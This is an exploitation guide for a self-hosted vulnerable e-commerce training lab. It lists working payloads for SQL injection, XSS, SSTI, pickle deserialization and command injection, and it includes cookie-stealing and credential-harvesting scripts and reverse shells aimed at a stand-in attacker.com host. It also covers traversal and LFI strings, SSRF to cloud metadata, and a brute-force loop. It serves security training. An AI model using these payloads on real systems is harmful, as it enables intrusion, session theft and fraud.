# 🔥 COMPLETE VULNERABLE E-COMMERCE LAB EXPLOITATION GUIDE

## 📋 Table of Contents
1. [Setup & Access](#setup--access)
2. [SQL Injection](#1-sql-injection)
3. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
4. [Business Logic Flaw - Coupon Abuse](#3-business-logic-flaw---coupon-abuse)
5. [Race Condition Exploitation](#4-race-condition-exploitation)
6. [Insecure Direct Object References (IDOR)](#5-insecure-direct-object-references-idor)
7. [Cross-Site Request Forgery (CSRF)](#6-cross-site-request-forgery-csrf)
8. [Directory/Path Traversal](#7-directorypath-traversal)
9. [Server-Side Request Forgery (SSRF)](#8-server-side-request-forgery-ssrf)
10. [Server-Side Template Injection (SSTI)](#9-server-side-template-injection-ssti)
11. [Insecure Deserialization](#10-insecure-deserialization)
12. [Command Injection](#11-command-injection)
13. [Local File Inclusion (LFI)](#12-local-file-inclusion-lfi)
14. [Broken Authentication & Authorization](#13-broken-authentication--authorization)

---

## Setup & Access

### Starting the Lab
```bash
cd "/Users/roshanajith/Documents/Coding/Cursor/Web Dev/Dynamic/Vulnerable-Lab"
source venv_new/bin/activate
python app.py
```

### Access URLs
- **Main Application**: http://127.0.0.1:5002
- **Network Access**: http://192.168.0.172:5002

### Default Credentials
- **Admin**: `admin` / `admin123`
- **User**: `john_doe` / `password123`
- **User**: `jane_smith` / `password456`

---

## 1. SQL Injection

### 🎯 Target: Login Page
**Vulnerability**: Raw SQL queries without parameterization

### Basic SQL Injection
```sql
Username: admin' OR '1'='1' --
Password: anything
```

### Advanced Exploitation
```sql
# Database enumeration
Username: admin' UNION SELECT sql,name,type,tbl_name FROM sqlite_master --
Password: anything

# Extract all users
Username: admin' UNION SELECT username,password,email,role FROM users --
Password: anything

# Extract all products
Username: admin' UNION SELECT name,price,description,stock FROM products --
Password: anything
```

### Automated Testing
```bash
python exploits/sqli_exploit.py
```

### Expected Results
- Bypass authentication
- Extract database schema
- Dump user credentials
- Access admin functionality

---

## 2. Cross-Site Scripting (XSS)

### 🎯 Target: Product Comments
**Vulnerability**: Unfiltered user input in comments

### Basic XSS Payloads
```html
<!-- Alert box -->
<script>alert('XSS Vulnerability!')</script>

<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

<!-- Session hijacking -->
<img src="x" onerror="fetch('http://attacker.com/log?session='+document.cookie)">
```

### Advanced XSS
```html
<!-- DOM manipulation -->
<script>
document.body.innerHTML = '<h1>Site Compromised!</h1>';
</script>

<!-- Credential harvesting -->
<script>
var form = document.createElement('form');
form.innerHTML = 'Username: <input type="text" name="user"><br>Password: <input type="password" name="pass"><br><input type="submit" value="Re-login">';
form.onsubmit = function(e) {
    e.preventDefault();
    fetch('http://attacker.com/harvest', {method: 'POST', body: new FormData(this)});
};
document.body.appendChild(form);
</script>
```

### Testing Steps
1. Navigate to any product page
2. Add a comment with XSS payload
3. Refresh page to see execution
4. Check if payload persists (stored XSS)

---

## 3. Business Logic Flaw - Coupon Abuse

### 🎯 Target: Apply Coupon Functionality
**Vulnerability**: Incorrect discount calculations

### Available Coupons & Flaws
| Coupon | Expected | Actual Behavior |
|--------|----------|----------------|
| SAVE10 | 10% off | 15% off (10% + 5% bonus) |
| WELCOME5 | 5% off | $50 per item type |
| MEGA50 | 50% off | 50% + $10 per item type |
| Others | Normal % | Double the discount rate |

### Exploitation Steps
1. Add items to cart (e.g., Gaming Mouse $79.99)
2. Go to checkout page
3. Apply SAVE10 coupon
4. **Expected**: $8.00 discount (10%)
5. **Actual**: $12.00 discount (15%)

### Maximum Exploitation
```
WELCOME5 on $79.99 item:
- Expected: $4.00 off (5%)
- Actual: $50.00 off (FREE + $29.99 credit!)
```

### Testing Script
```bash
python business_logic_flaw_demo.py
```

---

## 4. Race Condition Exploitation

### 🎯 Target: Apply Coupon Endpoint
**Vulnerability**: 300ms timing window allows concurrent requests

### Browser Console Exploit
```javascript
// Apply SAVE10 coupon 15 times concurrently
console.log("🚀 Starting Race Condition Attack...");
Promise.all(Array(15).fill().map((_, i) => 
    fetch('/apply_coupon', {
        method: 'POST',
        body: 'coupon_code=SAVE10',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        credentials: 'same-origin'
    }).then(r => console.log(`Request ${i+1}: HTTP ${r.status}`))
)).then(() => {
    console.log("🚨 RACE CONDITION COMPLETE!");
    setTimeout(() => location.reload(), 1000);
});
```

### Python Script Exploit
```bash
python apply_coupon_race_exploit.py
```

### Turbo Intruder (Burp Suite)
1. Capture POST /apply_coupon request
2. Send to Turbo Intruder
3. Use script: `turbo_intruder_race_condition_manual.py`

### Expected Results
- Multiple discount applications
- Stacked discounts in session
- Items become FREE or give money back
- SAVE10 applied 15x = $180 discount on $80 item!

---

## 5. Insecure Direct Object References (IDOR)

### 🎯 Targets: Multiple endpoints

### User Profile IDOR
```bash
# Access other users' profiles
GET /profile/1  # Admin profile
GET /profile/2  # Another user's profile
```

### Order Receipt IDOR
```bash
# Access any order receipt
GET /receipt/1
GET /receipt/2
GET /receipt/100
```

### File Access IDOR
```bash
# Access any uploaded file
GET /file/1
GET /file/2
```

### Automated Testing
```bash
python exploits/idor_exploit.py
```

### Exploitation Steps
1. Login as regular user
2. Note your user ID from URL
3. Modify ID parameter to access other users' data
4. Test different endpoints with various IDs

---

## 6. Cross-Site Request Forgery (CSRF)

### 🎯 Target: Sensitive actions without CSRF protection

### Password Change CSRF
```html
<!-- csrf_demo.html -->
<html>
<body onload="document.forms[0].submit()">
<form action="http://127.0.0.1:5002/change_password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
</body>
</html>
```

### Money Transfer CSRF
```html
<form action="http://127.0.0.1:5002/admin_wallet" method="POST">
    <input type="hidden" name="user_id" value="2">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="action" value="add">
</form>
```

### Testing Steps
1. Create malicious HTML file
2. Serve it on different domain/port
3. Trick authenticated user to visit
4. Actions execute with user's privileges

---

## 7. Directory/Path Traversal

### 🎯 Target: File viewing endpoints

### Basic Traversal Payloads
```bash
# Linux system files
../../../etc/passwd
../../../etc/hosts
../../../proc/version

# Application files
../app.py
../requirements.txt
../.env
```

### Advanced Bypasses
```bash
# URL encoding
..%2f..%2f..%2fetc%2fpasswd

# Double encoding
..%252f..%252f..%252fetc%252fpasswd

# Null byte injection
../../../etc/passwd%00.txt
```

### Automated Testing
```bash
python exploits/directory_traversal_exploit.py
```

### Manual Testing
1. Go to file viewing endpoint
2. Modify filename parameter
3. Try various traversal sequences
4. Look for sensitive file contents

---

## 8. Server-Side Request Forgery (SSRF)

### 🎯 Target: Stock checking API

### Internal Network Scanning
```bash
# Scan internal services
http://127.0.0.1:22    # SSH
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
```

### Cloud Metadata Access
```bash
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
```

### External Service Interaction
```bash
# Webhook testing
https://webhook.site/#!/your-unique-id

# Request bin
https://requestbin.com/
```

### Testing Steps
1. Navigate to admin stock checker
2. Intercept the stock API request
3. Modify URL to target internal services
4. Observe responses and timing differences

### Automated Testing
```bash
python ssrf_exploit.py
```

---

## 9. Server-Side Template Injection (SSTI)

### 🎯 Target: Template rendering endpoints

### Detection Payloads
```python
# Basic detection
{{7*7}}
${7*7}
#{7*7}

# Flask/Jinja2 specific
{{config}}
{{self.__init__.__globals__}}
```

### Command Execution
```python
# File read
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read()}}

# Command execution
{{self.__init__.__globals__['os'].popen('id').read()}}
```

### Exploitation Steps
1. Find template input fields
2. Test with basic math expressions
3. Escalate to command execution
4. Achieve remote code execution

---

## 10. Insecure Deserialization

### 🎯 Target: Session handling or data processing

### Python Pickle Exploitation
```python
import pickle
import base64
import os

# Malicious payload
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

# Serialize and encode
payload = pickle.dumps(EvilPickle())
encoded = base64.b64encode(payload)
```

### Testing Steps
1. Identify serialized data in cookies/requests
2. Create malicious serialized objects
3. Replace legitimate data with payload
4. Trigger deserialization

---

## 11. Command Injection

### 🎯 Target: System command execution points

### Basic Injection Payloads
```bash
# Command chaining
; whoami
&& whoami
|| whoami
| whoami

# Command substitution
`whoami`
$(whoami)
```

### Advanced Payloads
```bash
# Reverse shell
; nc -e /bin/bash attacker.com 4444
; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# File operations
; cat /etc/passwd
; ls -la /
```

### Testing Areas
- File upload processing
- System administration functions
- Report generation
- Backup/restore functions

---

## 12. Local File Inclusion (LFI)

### 🎯 Target: File inclusion mechanisms

### Basic LFI Payloads
```bash
# System files
/etc/passwd
/etc/hosts
/proc/version
/var/log/apache2/access.log

# Application files
../app.py
../config.php
../.env
```

### Log Poisoning
```bash
# Poison log files with PHP code
User-Agent: <?php system($_GET['cmd']); ?>
```

### Wrapper Exploitation
```bash
# PHP wrappers
php://filter/convert.base64-encode/resource=../config.php
data://text/plain,<?php phpinfo(); ?>
```

---

## 13. Broken Authentication & Authorization

### 🎯 Multiple attack vectors

### Session Management Issues
```bash
# Session fixation
1. Get session ID before login
2. Login with that session ID
3. Use same session for attacks

# Weak session tokens
- Predictable patterns
- Short length
- No entropy
```

### Authorization Bypasses
```bash
# Privilege escalation
- Access admin functions as regular user
- Modify role parameters in requests
- JWT token manipulation

# Horizontal privilege escalation
- Access other users' data
- Modify user ID parameters
```

### Password Attacks
```bash
# Brute force login
python -c "
import requests
for pwd in ['admin', '123456', 'password', 'admin123']:
    r = requests.post('http://127.0.0.1:5002/login', 
                     data={'username': 'admin', 'password': pwd})
    if 'dashboard' in r.url: 
        print(f'Found: {pwd}')
        break
"
```

---

## 🎯 ADVANCED EXPLOITATION CHAINS

### Chain 1: SQLi → Admin Access → CSRF → Mass Account Compromise
1. Use SQL injection to get admin credentials
2. Login as admin
3. Create CSRF payload to add money to accounts
4. Mass compromise user accounts

### Chain 2: XSS → Session Hijack → IDOR → Data Exfiltration
1. Plant persistent XSS in comments
2. Steal admin session cookies
3. Use admin access for IDOR attacks
4. Exfiltrate all user data

### Chain 3: Race Condition → Free Items → Business Impact
1. Exploit race condition in apply_coupon
2. Stack 20+ discount applications
3. Get free items + money back
4. Scale attack for maximum impact

### Chain 4: SSRF → Internal Network → Pivot Attack
1. Use SSRF to scan internal network
2. Identify internal services
3. Pivot to internal systems
4. Achieve full network compromise

---

## 🛡️ DETECTION & PREVENTION

### Monitoring Points
- Unusual discount applications
- High-value transactions with massive discounts
- Multiple concurrent coupon requests
- Failed authentication attempts
- Unusual file access patterns
- Abnormal system commands

### Prevention Measures
- Input validation and sanitization
- Parameterized queries
- CSRF tokens
- Rate limiting
- Session management
- File access controls
- Command execution restrictions

---

## 📊 EXPLOITATION RESULTS SUMMARY

| Vulnerability | Impact | Ease | Detection |
|--------------|---------|------|-----------|
| SQL Injection | High | Easy | Medium |
| XSS | Medium | Easy | Low |
| Business Logic | High | Easy | Low |
| Race Condition | High | Medium | Low |
| IDOR | Medium | Easy | Medium |
| CSRF | Medium | Easy | Medium |
| Path Traversal | Medium | Medium | Medium |
| SSRF | High | Medium | High |
| SSTI | High | Hard | High |
| Deserialization | High | Hard | Medium |
| Command Injection | High | Medium | High |
| LFI | Medium | Medium | Medium |
| Broken Auth | High | Easy | Medium |

---

## 🚀 QUICK START EXPLOITATION

### Fastest High-Impact Attacks
1. **Business Logic + Race Condition**: Free items in 30 seconds
2. **SQL Injection**: Admin access in 10 seconds
3. **IDOR**: Access all user data in 5 minutes
4. **XSS**: Persistent compromise in 2 minutes

### Recommended Testing Order
1. SQL Injection (Authentication bypass)
2. Business Logic Flaw (Immediate value)
3. Race Condition (Maximum impact)
4. IDOR (Data access)
5. XSS (Persistent access)
6. CSRF (Account takeover)
7. Advanced techniques (SSRF, SSTI, etc.)

---

*⚠️ This lab is for educational purposes only. Never test these techniques against systems you don't own or have explicit permission to test.*
